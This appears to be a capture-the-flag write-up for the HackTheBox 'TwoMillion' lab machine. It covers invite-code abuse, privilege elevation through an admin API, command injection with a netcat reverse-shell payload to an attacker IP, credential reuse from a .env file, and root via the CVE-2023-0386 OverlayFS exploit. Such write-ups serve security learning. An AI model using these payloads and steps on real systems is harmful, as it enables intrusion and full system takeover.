---
title: "TwoMillion"
date: 2025-08-18 13:49:00 +0500
categories: [Boxes]
tags: [HTB, Box, Linux, Easy]
---

## Recon

### Port Discovery

```bash
sudo nmap -PN -sC -sV -oN twomillion 10.10.11.221                                                                                     
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-18 13:51 PKT
Nmap scan report for 10.10.11.221
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.61 seconds
```

Let's add `2million.htb` to our `/etc/hosts`. 

### Web Enumeration

We are greeted with the legacy version of HackTheBox back from 2017.

![alt text](/assets/images/2million-web.png)

We have a login page, however, we have no creds. To join hackthebox we need to "hack" their invite process. 

![alt text](/assets/images/2million-invite.png)

Let's fire up burpsuite and analyze the requests on this page. We will enter a random code and figure out how they verify the code:

![alt text](/assets/images/2million-code.png)

On trying something like `/api/v1/invite/generate` (this was purely an instinct "WHAT IF?" there are other ways of figuring out it's existence): 

![alt text](/assets/images/2million-generate.png)

We see `Method not allowed`. Perhaps POST will work? 

![alt text](/assets/images/2million-POST.png)

and we have a code! 

`RlQyS00tTVRKSkUtRzlWVEctQ0hLMEI=`

This is base64, we decode it to get `FT2KM-MTJJE-G9VTG-CHK0B`, let's sign up. 

![alt text](/assets/images/2million-access.png)

We constantly see API endpoints:

![alt text](/assets/images/2million-api.png)

`/api/v1/user/` is what's getting us the VPN. We will try to figure out how many API endpoints are there:

If we do:

```http
GET /api/v1 HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=cilcpcvlsnqcegjmaldcl7s80n
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

We get a list of API:

```json
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

### Abusing admin endpoint

On going to `/auth` we get `false` and that's obvious since our user isn't really an admin. Let's try PUT method and make our user an admin.

If we try:

```http
PUT /api/v1/admin/settings/update HTTP/1.1
```

We get:

```json
{"status":"danger","message":"Invalid content type."}
```

Most of the times the content-type is json for such endpoints, let's try it:

```http
PUT /api/v1/admin/settings/update HTTP/1.1
<SNIP>
Content-Type: application/json
<SNIP>
```

We get:

```json
{"status":"danger","message":"Missing parameter: email"}
```

Let's add our emai to the request body:

```json
{
  "email": "khan@2million.htb"
}
```

We get:

```json
{"status":"danger","message":"Missing parameter: is_admin"}
```

Let's add `is_admin` parameter as well:

```json
{
  "email": "khan@2million.htb",
  "is_admin": 1
}
```

We get:

```json
{"id":13,"username":"khan","is_admin":1}
```

We are now admin, you could also verify it by going to `/api/v1/admin/auth`.

### Interacting with admin endpoints

Since we are an admin we are now left with this endpoint that we hadn't interacted with so far:

`/api/v1/admin/vpn/generate` - POST

If we do:

```http
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
Cookie: PHPSESSID=cilcpcvlsnqcegjmaldcl7s80n
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

We get:

```json
{"status":"danger","message":"Missing parameter: username"}
```

If we add the parameter username:

```json
{
  "username": "khan"
}
```

We are returned with:

```bash
client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
```

## Foothold

### Abusing ovpn script generation

A certificate/vpn file for openvpn. Looking at the openVPN documentations every client must have a different cert/key pair. There is bound to be an script running on OS level that takes our username and generates a file. Let's try for command injection. 

On sending a payload:

```json
{
  "username": ";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.30 1234 >/tmp/f"
}
```

We indeed get a shell.

```bash
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.30] from (UNKNOWN) [10.10.11.221] 49254
sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

### TTY Upgrades

Let's make this shell a bit more stable.

```bash
$ python3 -c "import pty; pty.spawn('/bin/bash');"
www-data@2million:~/html$ ^Z
zsh: suspended  nc -lvnp 1234
                                                                                                                                                                                                              
┌──(kali㉿vm-kali)-[~/htb/twomillion]
└─$ stty raw -echo; fg 
[1]  + continued  nc -lvnp 1234
                               export TERM=xterm
```

### Enumeration

Let's start our enumeration again:

```bash
www-data@2million:~/html$ ls -la
total 56
drwxr-xr-x 10 root root 4096 Aug 18 09:20 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 Aug 18 09:20 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
```

There's a `.env` file: 

```bash
www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Let's test for credentials reuse:

```bash
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:/var/www/html$ 
```

We can also SSH with the creds.

## Privilege Escalation

We will start with `sudo -l`: 

```bash
admin@2million:~$ sudo -l
[sudo] password for admin: 
Sorry, user admin may not run sudo on localhost.
```

Let's transfer LinPEAS and run it:

```bash
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                                              
/dev/mqueue                                                                                                                                                                                                   
/dev/shm
/home/admin
/run/lock
/run/screen
/run/screen/S-admin
/run/user/1000
/run/user/1000/dbus-1
/run/user/1000/dbus-1/services
/run/user/1000/gnupg
/run/user/1000/systemd
/run/user/1000/systemd/generator.late
/run/user/1000/systemd/generator.late/app-snapx2duserdx2dautostart@autostart.service
/run/user/1000/systemd/generator.late/xdg-desktop-autostart.target.wants
/run/user/1000/systemd/inaccessible
/run/user/1000/systemd/inaccessible/dir
/run/user/1000/systemd/inaccessible/reg
/run/user/1000/systemd/transient
/run/user/1000/systemd/units
/snap/core20/1891/run/lock
/snap/core20/1891/tmp
/snap/core20/1891/var/tmp
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/tmux-1000
/tmp/.X11-unix
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/lib/php/sessions
/var/mail/admin
/var/tmp
```

What I noticed was the unusual `/var/mail/admin` file. 

### admin mail

```bash
admin@2million:/var/mail$ cat admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

Let's search for linux kernal exploit specifically for `OverlayFS / FUSE`. 

There are multiple articles on it:

### CVE-2023-0386

[OverlayFS LPE](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386)

We will use the POC: [POC](https://github.com/xkaneiki/CVE-2023-0386)

I know it looks sketchy but trust. Make an archive:

```bash
tar -cvzf CVE.tar.gz CVE-2023-0386
```

Transfer it to the victim machine. Run `make all`. 

Run this in the first terminal on victim machine:

```bash
./fuse ./ovlcap/lower ./gc
```

SSH again and run this:

```bash
admin@2million:~/CVE-2023-0386$ ./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Aug 18 10:24 .
drwxrwxr-x 6 root   root     4096 Aug 18 10:24 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:~/CVE-2023-0386# whoami
root
```

## thankyou_json.txt

This is what the text resolves to:

```
Dear HackTheBox Community,

We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.

From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.

To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.

Here's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.

With deepest gratitude,

The HackTheBox Team
```

---
